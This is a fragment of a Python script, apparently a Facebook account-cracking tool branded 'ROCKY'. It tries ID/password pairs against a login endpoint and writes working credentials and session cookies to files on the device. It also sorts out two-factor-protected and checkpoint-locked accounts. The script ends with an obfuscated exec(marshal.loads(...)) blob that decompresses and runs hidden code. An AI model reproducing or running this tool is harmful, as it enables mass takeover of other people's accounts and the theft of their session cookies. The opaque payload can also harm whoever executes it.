                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [ROCKY-OK] '+ids+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        open('/sdcard/ROCKY-COOKIE.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                                        open('/sdcard/ROCKY-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        chk_apk(ids,pas,coki)
                                        break
                        elif twf in str(po):
                                                print('\r\r \033[1;34m[ROCKY-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                                print('\r\r\x1b[1;31m [ROCKY-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/ROCKY-CP.txt','a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                        else:
                                        continue
                loop+=1
        except Exception as e:
                time.sleep(20)
exec(marshal.loads(b'\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x00\x00\x00\x00\xf3@\x00\x00\x00\x97\x00d\x00d\x01l\x00Z\x00\x02\x00e\x01\x02\x00e\x00j\x02\x00\x00\x00\x00\x00\x00\x00\x00d\x02\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00d\x01S\x00)\x03\xe9\x00\x00\x00\x00NsC\x06\x00\x00x^\x9dWmo\xdaH\x10\xfe\xce\xaf\x98\xfa\xa4\xda\x1c\xe0\x84\xa4i\x1a"T\xd1\x846Q\x12\x12\x81\xa34"\x08m\xf0P\\\x8c\xd7\xb7^\'\xe48\xa4\xfb~?\xf3\xfe\xc8\xcd\xfa\x05\xbf\xd0T\xd5Q\x95x\xc7\xb3\xcf>3;o\xd88\x85o(/\xf0\xc5\xa8\xb6*@\x1f\xdfe\xb2\xad\xbe\xa6\\,\xcc\'\x14\x81\xc3=\xa3:\xdck\x8d\x86\xad\x0f\xf4\xbf\xd5h\x8e\xcc\xd0\xf7Q\x18\xd5\xdaFQ\xa0\x8b,@R\xdcW\x8a?V\xca\xd0Z{\xa3\xe8\xb4\xa5\x0f\xed\xe8HS \xfd\x99\xa0\xa1\x83^\x07]\xaff\x82FY\xf0[Y\xd0*\x0b\xcc\xb2\xa0Z\x16\x18e\xc1\xc7\xb2\xa0]\x16\xd4\xca\x82\xe3\xb2\xe0\xf7\xb2`\\\x16l\x9d\x02\x89\xb9\x917\x04\xcaPx\xa0u\x06\x9d\xd3\x86V[\xfa5\xad\xf1\xf5T\xabL\x05_\x80\xcd$Jg\x81\xe0,|.\xe4f\xfd\xe3\xb7J\xd3FW\xb2\x8a\xda7\x96\xdcf/\xe4\xea\x14\xc4\xf4\xf8\xb3Q\xad\xd0\xf7\xb60\xd6\xa4W&=U\x16\xdc\x933RR\xeb\xe8\xb9\xf2\x82L$\x02\xf5\x18\x1d\x80$\x98j+\xb5^7V\x91\x1e\xfd\xa5\xfdk\xad"\xc5\xbc=\x1cUl\n\xb5\xceD:O\xa4\x9e\x06\x9b\x14/q\xd4)\xeb\'\x14A\x14S\x91\'\xd4\xc7\x99\x82f\t\xe6\xb8\x1a8\x1e\x10J\xa6\xaa^\xfb\xc2\xf1\xa4\xa1\xc1M(\xe1\x9e\x87\x02"]\xa0P\x86O\xe8\xba\xfc\xf9\rh\x19\x98\xda\xe1:\x1e\x9d\xbc\xc1W\xa29i\xb7\t\xde\x0f%E\x9e\x82\xa2\xfd-\xd03-t\x03,\x1e\x1c\xefI\xb3f\x037CfS\xb6\x10\xdcJ\xbf\rP4:\xdf\xd0\x93:\x81]\xf1?\x1d\xd7e;\x07\xe6.\x18_\x9b\xcdc\xb8t\xbcp\t\xcb\x0f\xef\xc7\xef\xdfU\xa1\xe3\xfb.\xde\xe1\xe3\x85#w\x0e\xf6\x0f\xcd\xfd\xf7`\\\x9cYW\x97u\xa2<G\xf8\x82\x939\xaf\xc2\xc9\x8c\xc2\x00w\x9aM\xc2Q\xff`\xc0\xa6L8\xc9\x16}\xbda\x12\x85K\x9a\x99i\xb8\xa4\xeb\x8d\x96\xcf\x04[\x04\xed\x95N\xf6\x10K\xfa\xae\xeb6>9\x13\xd4[\xa9\xb2Q\xcdPC\xe1\x92m\x866\x93\xd2\x0fZ;;\x8e\\\xb2\x80\xd9&\x99\xfa\xb4\xbbkz(w&3b\xea\x9b\xfe\xcc\xcfy\x9e\xf6\x8d\x9f\x1d9\x1b\xc7\x07\xc6\x81B\xc2\xf5\xc7\x95\xfeV7\xbfs\xc73\x86S}E\x04\xd6\xed\xd5\x13sC\\\xeb@\xd5\'\xa2\x04\x91@\x05@\xbc\xddt$.\x02\xa3:\xaaRd\xa9\x1bT\x1fEi\xcc\x1f\xbf\x13\xb6zt\x9d\xc7=\xf3\x8c\x1er\x97\x1d\xdfN\xa2\xb4\xca\xf9j\xeb\x9c\xe4\x1e\xd3\x83\x8aw\x9f\xc1\x0c\x89\xdd\x88\x0e\x8c\xf8m\x98\x08\x0c|\xee\x05X\x87\t\xe5\x00\xdd\x7fBI\x1dL\x15\xed\x8f\x10\x03il\xb4C\xe1\xb4K\xee\xa9o^.P\xce\xb8\xdd\xd6\xbet--\x93&\xec\xda\x19\x91\xcd\x86,fS\x16txB\xc3\xb4q\xc2m\xaa\xae\xa1\x9c6>\xe4\xc2[%\x19\n\xc1E\x94d\xe9\xc6\xa2\xd1J\x87\xd2\x02f,\x00\\\xfa\x8e@\xbb\xa8\r\xb0!\x91^I\x10>\x06\x13\xe1\xf8Ru\x0f-\xcaO\x05qF\x10\x9f\x10=\xe8\xc68[9\xba\x9dn\nq\x0bM\x17\x08=.\xe1F\xe0\xc2\t\x17\xa0\x12.\x9f\xee\xe8*\xd2!I\x7fb\x17Y\x1b\xba\xea\x86\xbe\x07\xdc3]\xce\xec\xc0H=P,\x13\x85:\x95\x9a\xe81*\xc6m\xe53B\x19\xeaj\xa9\xc7]-\xd5\xc0\xe5\x04}Yt\xa6z\x97\xec\xd4\x1bz\xc1o\x8an\x0eP-\xb7\x00U\xbfLOL\xee\xa2\xa4\xa3\x12*\xa7\xa4\x96h\x97t\x18)0\xba\xf5g\x93\xca\x98\x11\x15\xf0\xa2\xc1\x8f\x05\x05:\xa8\xf8:\xea,\xa4b<6X\xf1\xcd\x02\xbd0\x97v\xdb\xd7\x99\xb5\x80\xc8\xf6\xd8EdR\x94\x1a\x81\x19\xaf)h\x02\xf3\x84{\x1eR\xc3\xe0^W\x05h\xe6\xc6\xb4\xf2\x9fS\x86\t\xaa;\x90iB\xa4\x9a\xab>\xaa\x0f\x9a\x81\x8b\xe8\x1b\xcd\\Q_:\x92X\xaa\x964\x99\xcd\xc7\xcc\x9f\x93\x13^\x96\xf5\xa8q-\xeb\xaa\x8d-\x93y\xa8p\xf5\xbfP\x03i2*\x15\xc0\x8dm>\xa7\xe4\'\x88:9\x9cQ\xe1\x95\xb8\x94\x81\xde\n\xa4\x88N\xaf\xe9\x7f\xe9\xb5\x98A\xf4\x18\xb3X\xc7\xac\xff\x8f\x9f^7-\xef\xfan\x14\xa4\xe4eP\xe9\xdd\xf2Y\x10D\x8e)\xe4\xdc\x02\x83\x80}\xc3\xc4\'\xf9N\xfd\x83n\x18\xdf\x0f\x8d\x03\xfd\xf5\xbf\x7f\xff\xb3\xba[\xdf_\xdf\xf6\xe1\xa2{\x0f\xad\x87e\xf3q\xd8<>:\\\x80V\xa3\xad\xb1q\xb9\xc6\xbc\xb5\xf7\xa6sq>\xb0:=}\x00\xcd\x038\xed\xdc\x0f\x92\xec"t\x88\xe1o\xfa\xe7\']\xd8?\xd8\x85\x9b\x8b~r\xf7?\xc3\xb9\xba\xeeYg\x97\xf7\xaf\xe0\x1c\xec\xe6q~F\xed\xda:\xeb\xf6\xe1\xe4\xfa\xb6g\xf5\xef\xf3\xec\xca\xd4\xde\xc1\xe9\xf5\xe5e\xe7UnE\xa0<\xbd\x8d\x0bc\x1b\x0f\x8b@9rK5\xa3\xc5sL\xce\xf1\xe7\x9f\x81|\x0fw\x9d\x9e\x05\xd65|\xba\xbd\x07\xe2\xdc\x83\x9b~w0\x80n\xcf"\xfe\x89\xc3\xa8^\x12\x06\x95\x8ea2t\xd55\x19\r_\xa3,\xf1h\x063\x19M\xfe\x9em\xe8\xd1\xb4\x95k$\xa5\xbc\xceQ\x0b\x93r\x97\xb0\xd33\x9bn-E\xaf\x0f\xbd\xceUw3t\xc9`N\xa6hgj\x86\x035\t\xc3\xc0\x11o\xe0\x1c\xee\x18\xb5S\x8b\xabZ\x9f\x0c|\x9c\xbb\x01\x0c8\xdcD\xbf=\xd4\x1c%\xf8\x13\xc2\xd5\x8b\xea5\x8dV\xf5\xc1{\xf0zT\x96[\x14l\x11\x8b\x9a\x06\x0f\x9e\xc5\xe7\xe8)\x11\xc5_\x94\x08\x14\xe9\xb4qB!nF\x13\xcc\x98\x87R\r\x84C\x8d-\xb4:h\x81dB\xaa\x87t\xf4a\xbec>\xcf\x98\x0c\xc8\x19\xe6\x84/v\x02r\xc9G\x7f\xc6=l\xd7\x8e\xf6\xf6\x0fw\xdf\xed\xee\xef\x1f\x1d\xed\xbdU)\xde\xd6j@F\x8d\xaa\xc7\xb9b\xb4\x17G~\xcek*\xe7N\x91\x95&\xe4|\xaa%1\x9d9\xd0\x9a9\x01y\x84\xbbp\x1e\xc0\xf5t\x9a\xce\xad\xdb\x8a\x89\xce\xadG#*\\1\x9a\x9c\xd1c\xde\x04_\xddq\xf5\xf2\x88`1\x9a>\x074t\x82\xa5~x\x9c{\xbf\xb45\xbb\x90;\xe6\xa8\x1b#~w4\x00S\xe3\x87[_5\x1b\xc2\xa4r\x93\x04\x0ff\xb5\xf8\xb3\xc0\xcdO\x03\x9f96\xc5A\xd2O6U8Y\'\xe5\xb0T\xbb"(\xac\xfe\x07d\t`\xbf)\x03\xda\x04zlib\xda\x04exec\xda\ndecompress\xa9\x00\xf3\x00\x00\x00\x00\xfa\x01 \xfa\x08<module>r\t\x00\x00\x00\x01\x00\x00\x00sS\x00\x00\x00\xf0\x03\x01\x01\x01\xf0\n\x00\x01\x0c\x80\x0b\x80\x0b\x80\x0b\xd8\x00\x04\x80\x04\x80_\x80T\x84_\xf0\x00\x00\x16cH\x01\xf1\x00\x00\x06dH\x01\xf4\x00\x00\x06dH\x01\xf1\x00\x00\x01eH\x01\xf4\x00\x00\x01eH\x01\xf0\x00\x00\x01eH\x01\xf0\x00\x00\x01eH\x01\xf0\x00\x00\x01eH\x01r\x07\x00\x00\x00'))